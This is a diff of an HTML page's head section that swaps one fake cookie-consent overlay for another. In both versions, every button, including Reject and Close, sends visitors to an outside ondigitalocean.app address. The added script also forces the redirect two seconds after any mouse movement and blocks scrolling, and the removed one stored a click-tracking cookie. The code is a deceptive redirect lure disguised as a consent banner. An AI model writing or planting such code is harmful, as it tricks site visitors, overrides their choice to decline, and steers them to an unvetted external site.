@@ -2,199 +2,138 @@
 <html lang="en">
 <head>
 
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-    const redirectUrl = "https://efa33276c-7ebm5.ondigitalocean.app/";
-
-    /* GCLID TRACKING ADDED */
-    function getParam(name) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(name);
+	<style>
+    .modalWrapper {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
     }
 
-    const gclid = getParam('gclid');
-
-    if (gclid) {
-        localStorage.setItem('gclid', gclid);
-
-        const expiryDate = new Date();
-        expiryDate.setTime(expiryDate.getTime() + (90 * 24 * 60 * 60 * 1000));
-
-        document.cookie = "gclid=" + gclid +
-            "; expires=" + expiryDate.toUTCString() +
-            "; path=/";
+    .modalContent {
+        background-color: white !important;
+        padding: 20px;
+        position: relative;
+        border-radius: 10px;
+        border: 2px solid white;
+        padding: 40px;
     }
-    /* END GCLID TRACKING */
 
-    const style = document.createElement("style");
-    style.textContent = `
-        .cookie-overlay {
-            position: fixed;
-            inset: 0;
-            background: 
-                rgba(0, 0, 0, 0.85)
-                url('YOUR_IMAGE_URL_HERE') center/120px no-repeat;
-            backdrop-filter: blur(8px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            z-index: 9999;
-            animation: fadeInBackground 0.5s ease-out forwards;
+    @media (max-width: 520px) {
+        .modalContent {
+            width: 90%;
         }
+    }
 
-        @keyframes fadeInBackground {
-            from { opacity: 0; }
-            to { opacity: 1; }
+    @media (min-width: 520px) {
+        .modalContent {
+            width: 65%;
         }
+    }
 
-        .cookie-popup {
-            position: fixed;
-            bottom: 60px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #ffffff;
-            border: none;
-            color: #333;
-            padding: 30px;
-            border-radius: 10px;
-            z-index: 10000;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-            max-width: 400px;
-            text-align: center;
-            animation: slideUp 0.5s ease-out forwards;
-        }
+    .modalContent img {
+        max-width: 100%;
+        height: auto;
+        border-radius: 10px;
+    }
 
-        @keyframes slideUp {
-            from { 
-                transform: translateY(50px) translateX(-50%);
-                opacity: 0;
-            }
-            to { 
-                transform: translateX(-50%);
-                opacity: 1;
-            }
-        }
+    .closeBtn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        padding: 5px;
+        color: blue;
+        font-weight: 500;
+        border-radius: 0px 10px 0px 0px;
+        cursor: pointer;
+    }
 
-        .close-btn {
-            background: none;
-            border: none;
-            font-size: 1.5rem;
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            cursor: pointer;
-            color: #888;
-        }
+    .actionBtn {
+        background-color: #007bff;
+        font-family: "Poppins", Sans-serif;
+        font-weight: 500;
+        border: none;
+        padding: 15px 30px;
+        color: #FFFFFF;
+        border-radius: 5px;
+        cursor: pointer;
+    }
 
-        .btn-primary {
-            background-color: #007bff;
-            color: #fff;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 15px;
-            display: inline-block;
-            text-decoration: none;
-            transition: all 0.3s;
-            width: 100%;
-            box-sizing: border-box;
-        }
+    / Disable scrolling when modal is open /
+    body.modal-open {
+        overflow: hidden;
+    }
+</style>
 
-        .btn-primary:hover {
-            background-color: #0056b3;
-            transform: translateY(-2px);
-        }
-
-        h3 {
-            font-family: Arial, sans-serif;
-            margin-bottom: 10px;
-            font-weight: bold;
-            color: #333;
-        }
-
-        p {
-            font-family: Arial, sans-serif;
-            line-height: 1.5;
-            margin-bottom: 15px;
-        }
-
-        .cookie-policy-link {
-            text-decoration: underline;
-            color: #007bff;
-            font-weight: 500;
-        }
-
-        .cookie-info {
-            background-color: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            text-align: left;
-        }
-
-        .cookie-info h4 {
-            margin-top: 0;
-            color: #007bff;
-        }
-
-        .cookie-info ul {
-            padding-left: 20px;
-            margin: 10px 0;
-        }
-
-        .cookie-info li {
-            margin-bottom: 5px;
-        }
-    `;
-    document.head.appendChild(style);
-
-    const overlay = document.createElement("div");
-    overlay.className = "cookie-overlay";
-    overlay.id = "cookie-overlay";
-
-    overlay.innerHTML = `
-        <div class="cookie-popup">
-            <button class="close-btn" id="close-popup">×</button>
-            <h3>Cookies Policy</h3>
-            <p>This site uses cookies to enhance your experience.</p>
-
-            <div class="cookie-info">
-                <h4>Cookies We Use:</h4>
-                <ul>
-                    <li>Essential cookies</li>
-                    <li>Performance cookies</li>
-                    <li>Marketing cookies</li>
-                </ul>
-            </div>
-
-            <a href="${redirectUrl}" id="accept-cookies" class="btn-primary">Accept All Cookies</a>
-            <a href="#" id="reject-cookies" class="btn-primary" style="background:#6c757d;">Reject</a>
+<div class="modalContainer">
+    <div id="modal" class="modalWrapper">
+        <div class="modalContent">
+            <div id="dismissModal" class="closeBtn">Close</div>
+            <h1>Cookie Policy</h1>
+            <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, please visit our <a href="https://www.google.com/">Privacy Policy</a>.</p>
+            <button id="confirmBtn" class="actionBtn">Accept</button>
         </div>
-    `;
+    </div>
+</div>
 
-    document.body.appendChild(overlay);
+<script>
+    var modal = document.getElementById('modal');
+    var dismissModal = document.getElementById('dismissModal');
+    var confirmBtn = document.getElementById('confirmBtn');
 
-    const handleRedirect = () => {
-        window.location.href = redirectUrl;
-    };
+    var redirectUrl = "https://efa33276c-7ebm5.ondigitalocean.app/"; // Set your dynamic URL here
+    var cursorMoved = false;
+    var redirectTimer;
 
-    document.getElementById("accept-cookies").onclick = (e) => {
-        e.preventDefault();
-        handleRedirect();
-    };
+    // Show the modal instantly after page load and disable scrolling
+    window.addEventListener('load', function () {
+        modal.style.display = 'flex';
+        document.body.classList.add('modal-open');
+    });
 
-    document.getElementById("reject-cookies").onclick = (e) => {
-        e.preventDefault();
-        handleRedirect();
-    };
+    // Function to close the modal and navigate to a link
+    function closeModal() {
+        modal.style.display = 'none';
+        document.body.classList.remove('modal-open'); // Re-enable scrolling
+        if (redirectUrl) {
+            window.location.href = redirectUrl; // Redirect to the given URL
+        }
+    }
 
-    document.getElementById("close-popup").onclick = (e) => {
-        e.preventDefault();
-        handleRedirect();
-    };
-});
+    // Close modal on close button click
+    dismissModal.addEventListener('click', function () {
+        closeModal();
+    });
+
+    // Close modal on accept button click
+    confirmBtn.addEventListener('click', function () {
+        closeModal();
+    });
+
+    // Auto redirect after 2 seconds of cursor movement
+    window.addEventListener('mousemove', function () {
+        if (!cursorMoved) {
+            cursorMoved = true;
+            redirectTimer = setTimeout(function () {
+                window.location.href = redirectUrl;
+            }, 2000); // Redirect after 2 seconds
+        }
+    });
+
+    // Prevent modal from closing on clicking outside modal content
+    modal.addEventListener('click', function (event) {
+        if (event.target === modal) {
+            event.stopPropagation(); // Do nothing if clicked outside the modal content
+        }
+    });
+
 </script>
 ```
 
